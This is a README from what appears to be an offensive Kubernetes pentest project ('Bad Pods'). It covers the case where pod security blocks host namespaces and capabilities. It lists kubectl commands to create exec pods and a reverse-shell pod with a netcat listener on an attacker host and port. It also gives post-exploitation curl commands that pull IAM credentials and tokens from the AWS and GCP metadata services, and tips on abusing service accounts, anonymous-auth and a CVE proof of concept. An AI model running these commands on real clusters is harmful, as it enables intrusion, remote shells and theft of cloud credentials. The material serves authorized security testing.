# Bad Pod #8: Nothing allowed

The pod security policy or admission controller has blocked access to all of the host's namespaces and restricted all capabilities. **Do not despair**, especially if the target cluster is running in a cloud environment. 

## Table of Contents
* [Pod Creation & Access](#Pod-Creation-&-Access)
   * [Exec Pods](#exec-pods-create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
   * [Reverse Shell Pods](#reverse-shell-pods-Create-one-or-more-of-these-resources-and-catch-reverse-shell)
   * [Deleting Resources](#Deleting-Resources)
* [Post exploitation](#Post-exploitation)


# Pod Creation
## Create a pod you can exec into
Create pod
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml 
```
Exec into pod 
```bash
kubectl exec -it nothing-allowed-exec-pod -- bash
```

## Reverse shell pod

Set up listener
```bash
nc -nvlp 3116
```

Create pod from local manifest without modifying it by using env variables and envsubst
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
```

Catch the shell
```bash
$ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation

* **Cloud metadata** - If cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node, or even just a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or both.

```bash
curl http://169.254.169.254/latest/user-data # aws
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] #aws
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/[account]/default/token #gcp
```

* **Overly permissive service account** - If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.

* **Anonymous-auth** - If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 
* **Exploits** - Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
* **Traditional vulnerability hunting** -Your pod will be able to see a different view of the network services running within the cluster than you likely can see from the machine you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 

[This write-up of a CTF challenge](https://keramas.github.io/2020/08/10/Recon-Village-CTF-at-DC28.html) created by Madhu Akula demonstrates a pretty common post exploitation pattern



# Reference(s): 

* https://securekubernetes.com/
* https://madhuakula.com/kubernetes-goat/
* https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/
* https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/
* https://github.com/tabbysable/POC-2020-8558
